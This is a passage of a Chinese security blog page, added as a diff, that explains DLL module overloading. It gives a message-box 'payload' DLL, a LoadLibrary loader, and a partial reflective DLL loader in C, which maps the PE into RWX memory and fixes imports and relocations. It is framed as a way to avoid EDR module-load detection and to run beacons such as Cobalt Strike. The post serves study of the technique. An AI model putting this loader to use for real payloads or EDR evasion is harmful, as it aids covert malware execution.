@@ -1,0 +1,492 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    
+    <style>
+        body
+        {
+            font-family: "Times New Roman", Helvetica, Tahoma, Arial,   "notoserifsc-medium", "Microsoft YaHei", "Hiragino Sans GB", "WenQuanYi Micro Hei", sans-serif !important;
+
+        }
+    </style>
+
+    <head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+    <meta name="description" content="DLL模块重载初探" />
+    <meta name="hexo-theme-A4" content="v2.0.1" />
+    <link rel="alternate icon" type="image/webp" href="/null">
+    <title>CHANGMEN&#39;s Blog | Network Security Professional</title>
+
+    
+        
+<link rel="stylesheet" href="/css/highlight/style1.css">
+
+        
+<link rel="stylesheet" href="/css/reset.css">
+
+        
+<link rel="stylesheet" href="/css/markdown.css">
+
+        
+<link rel="stylesheet" href="/css/fonts.css">
+
+         <!--注意：首页既不是post也不是page-->
+        
+
+        
+<link rel="stylesheet" href="/css/ui.css">
+
+        
+<link rel="stylesheet" href="/css/style.css">
+
+
+        
+            <!--返回顶部css-->
+            
+<link rel="stylesheet" href="/css/returnToTop.css">
+
+            
+<link rel="stylesheet" href="/css/unicons.css">
+
+        
+        
+            <!--目录-->
+            
+<link rel="stylesheet" href="/css/toc.css">
+
+        
+    
+
+    
+        
+<link rel="stylesheet" href="/css/returnToLastPage.css">
+
+    
+
+    
+<link rel="stylesheet" href="/css/lightgallery-bundle.min.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/custom.css">
+
+    
+
+    
+
+    <!-- <link rel="stylesheet" href="https://chinese-fonts-cdn.deno.dev/packages/lxgwwenkai/dist/LXGWWenKai-Regular/result.css" /> -->
+    <link rel='stylesheet' href='https://cdn.jsdelivr.net/npm/@chinese-fonts/lxgwwenkai@3.0.0/dist/LXGWWenKai-Regular/result.css' /> 
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+    
+    
+        <style>
+            .index-main{
+                max-width:  880px;
+            }
+        </style>
+
+    
+    
+
+
+
+    
+
+    
+    
+
+
+
+
+    <style>
+        .archive-main a:hover {
+            text-decoration: none; 
+        }
+    </style>
+
+    
+    
+
+
+    <body>
+        
+        <script src="https://cdn.jsdelivr.net/npm/darkreader@4.9.80/darkreader.min.js"></script>
+        <script>
+            const drOptions = {
+                brightness: 100,
+                contrast: 95,
+                sepia: 10,
+                darkSchemeTextColor: '#e0e0e0',  // 粉笔白文字
+                darkSchemeBackgroundColor: '#1e1e1e', // 黑板灰背景
+                scrollbarStyle: 'native'
+            };
+
+            const savedTheme = localStorage.getItem('theme');
+            const systemDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
+            if (savedTheme === 'dark' || (!savedTheme && systemDark)) {
+                DarkReader.enable(drOptions);
+            }
+
+            window.addEventListener('DOMContentLoaded', () => {
+                const btn = document.createElement('button');
+                btn.innerText = '🌓';
+                // 按钮样式：仿照你之前的布局，放在右下角
+                btn.style.cssText = `
+                    position: fixed; 
+                    bottom: 40px; 
+                    left: 42px; 
+                    z-index: 9999;
+                    width: 44px; 
+                    height: 44px; 
+                    border-radius: 50%; 
+                    border: 1px solid #ccc;
+                    background: #f7f5ed; 
+                    color: #000;
+                    font-size: 22px; 
+                    cursor: pointer;
+                    box-shadow: 0 4px 10px rgba(0,0,0,0.1); 
+                    transition: transform 0.2s, background-color 0.3s;
+                `;
+                // 根据当前状态初始化按钮颜色
+                if (DarkReader.isEnabled()) {
+                    btn.style.backgroundColor = '#1e1e1e';
+                    btn.style.color = '#fff';
+                }
+                btn.onmouseover = () => btn.style.transform = 'scale(1.1)';
+                btn.onmouseout = () => btn.style.transform = 'scale(1)';
+                document.body.appendChild(btn);
+                // 点击切换逻辑
+                btn.addEventListener('click', () => {
+                    if (DarkReader.isEnabled()) {
+                        DarkReader.disable();
+                        localStorage.setItem('theme', 'light');
+                        btn.style.backgroundColor = '#f7f5ed';
+                        btn.style.color = '#000';
+                    } else {
+                        DarkReader.enable(drOptions);
+                        localStorage.setItem('theme', 'dark');
+                        btn.style.backgroundColor = '#1e1e1e';
+                        btn.style.color = '#fff';
+                    }
+                });
+            });
+        </script>
+        
+        
+            
+                <div class="left-toc-container">
+                    <nav id="toc" class="bs-docs-sidebar"></nav>
+                </div>
+            
+        
+        <div class="paper">
+
+            
+
+            
+                <div class="shadow-drop-2-bottom paper-main">
+                    
+
+
+<div class="header">
+    <div class="header-container">
+        <style>
+            .header-img {
+                width: 56px;
+                height: auto;
+                object-fit: cover; /* 保持图片比例 */
+                transition: transform 0.3s ease-in-out; 
+                border-radius: 0; 
+            }
+            
+        </style>
+        
+        <div class="header-content">
+            <a class="logo" href="/">CHANGMEN&#39;s Blog</a> 
+            <span class="description">CHANGMEN的个人博客，专注于网络安全领域。</span> 
+        </div>
+    </div>
+    
+   
+    <ul class="nav">
+        
+            
+                <li><a href="/">首页</a></li>
+            
+        
+            
+                <li><a href="/list/">文章</a></li>
+            
+        
+    </ul>
+</div>
+
+                    
+                    
+
+                    
+                    
+
+                    <!--说明是文章post页面-->
+                    
+                        <div class="post-main">
+    
+
+    
+        
+            
+                <div class="post-main-title" style="text-align: center;">
+                    DLL模块重载初探
+                </div>
+            
+        
+      
+    
+
+    
+
+        
+            <div class="post-head-meta-center">
+        
+                
+                    <span>最近更新：2026-04-09</span> 
+                
+                
+                    
+                        &nbsp; | &nbsp;
+                    
+                     <span>字数总计：3.4k</span>
+                
+                
+                    
+                        &nbsp; | &nbsp;
+                    
+                    <span>阅读估时：18分钟</span>
+                
+                
+                    
+                        &nbsp; | &nbsp;
+                    
+                    <span id="busuanzi_container_page_pv">
+                        阅读量：<span id="busuanzi_value_page_pv"></span>次
+                    </span>
+                
+            </div>
+    
+
+    <div class="post-md">
+        
+            
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E5%89%8D%E8%A8%80"><span class="post-toc-text">前言</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E6%99%AE%E9%80%9Adll%E5%8A%A0%E8%BD%BD%E6%BC%94%E7%A4%BA"><span class="post-toc-text">普通dll加载演示</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E5%8F%8D%E5%B0%84dll%E5%8A%A0%E8%BD%BD%E6%BC%94%E7%A4%BA"><span class="post-toc-text">反射dll加载演示</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#DLL%E6%A8%A1%E5%9D%97%E9%87%8D%E8%BD%BD%E6%95%88%E6%9E%9C"><span class="post-toc-text">DLL模块重载效果</span></a></li></ol>
+            
+        
+        <div class=".article-gallery"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>dll是什么，简单说就是动态链接库，提供函数供我们使用，从导出表里即可看到dll的导出函数。</p>
+<h2 id="普通dll加载演示"><a href="#普通dll加载演示" class="headerlink" title="普通dll加载演示"></a>普通dll加载演示</h2><p>首先我们生成一个dll。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 这个程序模拟了我们要“重载”的恶意载荷（Payload）</span></span><br><span class="line"><span class="comment">// 在真实的攻击中，这就是Cobalt Strike Beacon的DLL</span></span><br><span class="line"><span class="comment">// 这里我们写一个简单的弹窗DLL来演示</span></span><br><span class="line"></span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        MessageBoxA(<span class="literal">NULL</span>, <span class="string">&quot;Hello from the Overloaded Module! (Payload DLL Executed)&quot;</span>, <span class="string">&quot;Success&quot;</span>, MB_OK | MB_ICONINFORMATION);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>加载器代码 <code>loader.cpp</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 默认 DLL 文件名（可修改为你的实际文件名）</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> dllPath = <span class="string">&quot;payload.dll&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果命令行提供了路径，则使用第一个参数</span></span><br><span class="line">    <span class="keyword">if</span> (argc &gt;= <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        dllPath = argv[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[Loader] Trying to load DLL: &quot;</span> &lt;&lt; dllPath &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加载 DLL – 这会自动调用 DllMain 并执行 DLL_PROCESS_ATTACH 代码</span></span><br><span class="line">    HMODULE hModule = LoadLibraryA(dllPath.c_str());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hModule == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        DWORD err = GetLastError();</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;[Loader] Failed to load DLL. Error code: &quot;</span> &lt;&lt; err &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;[Loader] Press Enter to exit...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cin</span>.get();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[Loader] DLL loaded successfully at 0x&quot;</span> &lt;&lt; <span class="built_in">std</span>::hex &lt;&lt; hModule &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[Loader] Press Enter to unload DLL and exit...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span>.get();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 可选：卸载 DLL（会触发 DLL_PROCESS_DETACH）</span></span><br><span class="line">    FreeLibrary(hModule);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[Loader] DLL unloaded. Exiting.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>执行</p>
+<p><a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/250wuyifan/WaiLian250/img/image-20260408222753286.png" title="image-20260408222753286" class="gallery-item" style="box-shadow: none;"> <img src="https://cdn.jsdelivr.net/gh/250wuyifan/WaiLian250/img/image-20260408222753286.png" alt="image-20260408222753286"></a></p>
+<p>此时我们的堆栈情况如下，不过实际中我们尽量不用那个直接加载的函数LoadLibraryA，这个很容易被edr的模块加载回调察觉到。</p>
+<p><a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/250wuyifan/WaiLian250/img/image-20260408223118586.png" title="image-20260408223118586" class="gallery-item" style="box-shadow: none;"> <img src="https://cdn.jsdelivr.net/gh/250wuyifan/WaiLian250/img/image-20260408223118586.png" alt="image-20260408223118586"></a></p>
+<h2 id="反射dll加载演示"><a href="#反射dll加载演示" class="headerlink" title="反射dll加载演示"></a>反射dll加载演示</h2><p>那么我们使用反射dll加载会是什么样子</p>
+<p>我们的加载器要换一下 loader.c</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义目标DLL的DllMain类型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">BOOL</span> <span class="params">(WINAPI *DLLMAIN)</span><span class="params">(HINSTANCE, DWORD, LPVOID)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从磁盘读取文件到内存的辅助函数</span></span><br><span class="line">BYTE* <span class="title function_">ReadFileToMemory</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* filepath, DWORD* outFileSize)</span> &#123;</span><br><span class="line">    HANDLE hFile = CreateFileA(filepath, GENERIC_READ, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to open file: %s\n&quot;</span>, filepath);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    DWORD fileSize = GetFileSize(hFile, <span class="literal">NULL</span>);</span><br><span class="line">    BYTE* buffer = (BYTE*)<span class="built_in">malloc</span>(fileSize);</span><br><span class="line">    </span><br><span class="line">    DWORD bytesRead;</span><br><span class="line">    <span class="keyword">if</span> (!ReadFile(hFile, buffer, fileSize, &amp;bytesRead, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to read file.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">free</span>(buffer);</span><br><span class="line">        CloseHandle(hFile);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    CloseHandle(hFile);</span><br><span class="line">    <span class="keyword">if</span> (outFileSize) *outFileSize = fileSize;</span><br><span class="line">    <span class="keyword">return</span> buffer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 纯C语言实现的反射式DLL加载核心逻辑</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">ReflectiveLoadDLL</span><span class="params">(BYTE* rawDllData)</span> &#123;</span><br><span class="line">    <span class="comment">// 1. 解析PE头部</span></span><br><span class="line">    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)rawDllData;</span><br><span class="line">    <span class="keyword">if</span> (dosHeader-&gt;e_magic != IMAGE_DOS_SIGNATURE) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Invalid DOS signature.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(rawDllData + dosHeader-&gt;e_lfanew);</span><br><span class="line">    <span class="keyword">if</span> (ntHeaders-&gt;Signature != IMAGE_NT_SIGNATURE) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Invalid NT signature.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 为DLL分配内存 (这里直接用正常的VirtualAlloc，不像PIC那样需要动态解析API)</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Allocating memory for DLL image (Size: 0x%X)...\n&quot;</span>, ntHeaders-&gt;OptionalHeader.SizeOfImage);</span><br><span class="line">    BYTE* dllBase = (BYTE*)VirtualAlloc(<span class="literal">NULL</span>, ntHeaders-&gt;OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (!dllBase) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] VirtualAlloc failed.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Memory allocated at: %p\n&quot;</span>, dllBase);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 复制PE头和所有的节(Sections)</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Copying headers and sections...\n&quot;</span>);</span><br><span class="line">    <span class="comment">// 复制头部</span></span><br><span class="line">    <span class="built_in">memcpy</span>(dllBase, rawDllData, ntHeaders-&gt;OptionalHeader.SizeOfHeaders);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 复制每一个节</span></span><br><span class="line">    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ntHeaders-&gt;FileHeader.NumberOfSections; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (sectionHeader[i].SizeOfRawData &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            BYTE* dest = dllBase + sectionHeader[i].VirtualAddress;</span><br><span class="line">            BYTE* src = rawDllData + sectionHeader[i].PointerToRawData;</span><br><span class="line">            <span class="built_in">memcpy</span>(dest, src, sectionHeader[i].SizeOfRawData);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 处理导入表 (Import Table) - 极其重要的一步</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Resolving Import Address Table (IAT)...\n&quot;</span>);</span><br><span class="line">    IMAGE_DATA_DIRECTORY* importDir = &amp;ntHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];</span><br><span class="line">    <span class="keyword">if</span> (importDir-&gt;Size &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)(dllBase + importDir-&gt;VirtualAddress);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> (importDesc-&gt;Name) &#123;</span><br><span class="line">            <span class="comment">// 加载依赖的DLL (例如 kernel32.dll, user32.dll)</span></span><br><span class="line">            <span class="type">char</span>* moduleName = (<span class="type">char</span>*)(dllBase + importDesc-&gt;Name);</span><br><span class="line">            HMODULE hModule = LoadLibraryA(moduleName);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;    -&gt; Loading dependency: %s at %p\n&quot;</span>, moduleName, hModule);</span><br><span class="line"></span><br><span class="line">            PIMAGE_THUNK_DATA origFirstThunk = (PIMAGE_THUNK_DATA)(dllBase + importDesc-&gt;OriginalFirstThunk);</span><br><span class="line">            PIMAGE_THUNK_DATA firstThunk = (PIMAGE_THUNK_DATA)(dllBase + importDesc-&gt;FirstThunk);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!origFirstThunk) &#123;</span><br><span class="line">                origFirstThunk = firstThunk;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 遍历并解析每一个函数</span></span><br><span class="line">            <span class="keyword">while</span> (origFirstThunk-&gt;u1.AddressOfData) &#123;</span><br><span class="line">                FARPROC functionAddress = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (IMAGE_SNAP_BY_ORDINAL(origFirstThunk-&gt;u1.Ordinal)) &#123;</span><br><span class="line">                    <span class="comment">// 按序号导入</span></span><br><span class="line">                    functionAddress = GetProcAddress(hModule, (LPCSTR)IMAGE_ORDINAL(origFirstThunk-&gt;u1.Ordinal));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// 按名称导入</span></span><br><span class="line">                    PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)(dllBase + origFirstThunk-&gt;u1.AddressOfData);</span><br><span class="line">                    functionAddress = GetProcAddress(hModule, (LPCSTR)importByName-&gt;Name);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 将解析到的真实地址填入 IAT</span></span><br><span class="line">                firstThunk-&gt;u1.Function = (ULONGLONG)functionAddress;</span><br><span class="line"></span><br><span class="line">                origFirstThunk++;</span><br><span class="line">                firstThunk++;</span><br><span class="line">            &#125;</span><br><span class="line">            importDesc++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 处理重定位表 (Base Relocation Table)</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Processing Relocations...\n&quot;</span>);</span><br><span class="line">    <span class="comment">// 计算当前加载的基址和DLL默认基址的差值 (Delta)</span></span><br><span class="line">    ULONG_PTR delta = (ULONG_PTR)dllBase - ntHeaders-&gt;OptionalHeader.ImageBase;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (delta != <span class="number">0</span>) &#123;</span><br><span class="line">        IMAGE_DATA_DIRECTORY* relocDir = &amp;ntHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];</span><br><span class="line">        <span class="keyword">if</span> (relocDir-&gt;Size &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            PIMAGE_BASE_RELOCATION relocBlock = (PIMAGE_BASE_RELOCATION)(dllBase + relocDir-&gt;VirtualAddress);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">while</span> (relocBlock-&gt;VirtualAddress) &#123;</span><br><span class="line">                DWORD numEntries = (relocBlock-&gt;SizeOfBlock - <span class="keyword">sizeof</span>(IMAGE_BASE_RELOCATION)) / <span class="keyword">sizeof</span>(WORD);</span><br><span class="line">                WORD* relocEntry = (WORD*)((BYTE*)relocBlock + <span class="keyword">sizeof</span>(IMAGE_BASE_RELOCATION));</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> (DWORD i = <span class="number">0</span>; i &lt; numEntries; i++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (relocEntry[i] &gt;&gt; <span class="number">12</span> == IMAGE_REL_BASED_DIR64) &#123;</span><br><span class="line">                        <span class="comment">// 对于64位DLL，修改绝对地址</span></span><br><span class="line">                        ULONG_PTR* patchAddr = (ULONG_PTR*)(dllBase + relocBlock-&gt;VirtualAddress + (relocEntry[i] &amp; <span class="number">0xFFF</span>));</span><br><span class="line">                        *patchAddr += delta;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 移动到下一个重定位块</span></span><br><span class="line">                relocBlock = (PIMAGE_BASE_RELOCATION)((BYTE*)relocBlock + relocBlock-&gt;SizeOfBlock);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> 